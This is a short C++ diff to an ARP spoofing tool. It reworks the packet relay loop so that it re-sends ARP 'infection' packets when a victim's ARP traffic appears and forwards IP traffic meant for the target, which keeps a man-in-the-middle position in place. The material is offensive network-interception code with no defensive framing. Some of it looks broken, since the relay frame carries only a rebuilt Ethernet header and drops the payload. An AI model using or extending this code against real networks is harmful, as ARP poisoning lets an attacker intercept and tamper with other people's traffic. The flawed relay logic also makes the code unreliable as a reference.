@@ -18,19 +18,27 @@ void ArpSpoofer::push_relay_packet()
         my_eth /= my_ip;    
         bytes b = bytes(pkt, pkt+sizeof(Ethernet)+sizeof(IP));
         my_eth.deserialize(b);
+                                        
         for(auto s : sessions) {
-            if( my_eth.src_mac().mac() == s.sender_mac->mac() ){
-                if( my_ip. )
-                    goto EX; 
-            }     
-                
-        }
-        continue;
-EX: 
-        if((uint16_t)my_eth.type() != (uint16_t)Ethernet::EtherType::IP ) 
-            continue;
-        
-
+            switch (htons((int16_t)my_eth.type()))
+            {
+            case (uint16_t)Ethernet::EtherType::ARP :{
+                if ( my_eth.dst_mac().mac() == s.target_mac->mac() ) 
+                    relay_qeue.push( make_infection(s).serialize() );                
+                break;
+            }
+            case (uint16_t)Ethernet::EtherType::IP :{
+                if ( my_ip.dest_ip().ip() == s.target_ip->ip() )  {                    
+                    relay_qeue.push( 
+                        Ethernet(iface.mac(), *s.target_mac,Ethernet::EtherType::IP).serialize()
+                    );                
+                }
+                break;
+            }
+            default:
+                break;
+            }
+        }        
     }
 }
 
@@ -41,7 +49,7 @@ void ArpSpoofer::run()
         ifv.push_back(make_infection(sess));        
     
     while(not relay_qeue.empty()) {
-        arp_sender.send_packet(relay_qeue.front()->serialize());
+        arp_sender.send_packet(relay_qeue.front());
         relay_qeue.pop();
     }
 
